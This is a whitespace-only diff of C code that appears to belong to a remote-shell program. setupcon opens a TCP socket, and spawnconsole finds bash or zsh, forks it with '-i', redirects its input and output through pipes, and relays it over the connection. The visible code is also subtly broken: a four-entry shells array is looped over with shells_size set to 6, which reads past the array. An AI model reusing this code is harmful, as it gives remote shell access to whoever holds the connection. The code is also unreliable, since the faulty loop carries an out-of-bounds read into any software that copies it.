@@ -42,7 +42,6 @@ struct connection {
 	bool exit;
 };
 
-
 int setupcon(struct connection *con)
 {
 	con->sock = socket(PF_INET, SOCK_STREAM, 0);
@@ -74,7 +73,6 @@ int setupcon(struct connection *con)
 	if (fcntl(con->procout[1], F_SETFL, O_NONBLOCK)) {
 		return -7;
 	}
-
 
 	// set keepalive
 	{
@@ -169,11 +167,12 @@ int spawnconsole(struct connection *con)
 	int rv;
 	size_t i;
 
-	char *shells[] = {"/bin/bash", "/usr/bin/bash", "/bin/zsh",	"/usr/bin/zsh"};
+	char *shells[] = { "/bin/bash", "/usr/bin/bash", "/bin/zsh",
+			   "/usr/bin/zsh" };
 
 	const size_t shells_size = 6;
 
-  // Search for a working shell
+	// Search for a working shell
 	dbprint("Searching for shells...\n");
 	for (i = 0; i < shells_size; i++) {
 		if (access(shells[i], F_OK) == 0) {
@@ -191,17 +190,17 @@ int spawnconsole(struct connection *con)
 	{
 		pthread_t thread;
 		pid_t pid;
-		char *argv[] = { shells[i], "-i", NULL};
+		char *argv[] = { shells[i], "-i", NULL };
 
 		pid = fork();
 		if (pid == 0) {
-		  // As child
-		  dbprint("Closing unneeded fds...\n");
+			// As child
+			dbprint("Closing unneeded fds...\n");
 			if (close(con->procout[0]) | close(con->procin[1])) {
 				return -1;
 			}
 
-		  dbprint("Dupping i/o fds...\n");
+			dbprint("Dupping i/o fds...\n");
 			if (dup2(con->procin[0], STDIN_FILENO) < 0) {
 				return -2;
 			}
@@ -220,14 +219,14 @@ int spawnconsole(struct connection *con)
 			}
 
 		} else if (pid < 0) {
-		  // On error
+			// On error
 			return -7;
 		}
-   
-    // Close unneeded fd's
-    if (close(con->procout[1]) || close(con->procin[0])) {
-      return -8;
-    }
+
+		// Close unneeded fd's
+		if (close(con->procout[1]) || close(con->procin[0])) {
+			return -8;
+		}
 
 		// Create relay thread
 		con->exit = false;
@@ -236,17 +235,16 @@ int spawnconsole(struct connection *con)
 		}
 		dbprint("Created relay thread!\n");
 
-
 		// Wait for shell to exit
 		while (1) {
-      if (con->exit) {
-        // Try to kill the process
-        if (kill(pid, SIGKILL)) {
-          dbprint("Killing shell failed!\n");
-          return -10;
-        }
-        dbprint("Killed shell!\n");
-      }
+			if (con->exit) {
+				// Try to kill the process
+				if (kill(pid, SIGKILL)) {
+					dbprint("Killing shell failed!\n");
+					return -10;
+				}
+				dbprint("Killed shell!\n");
+			}
 
 			if (waitpid(pid, &rv, WNOHANG) >= 0) {
 				if (WIFEXITED(rv)) {
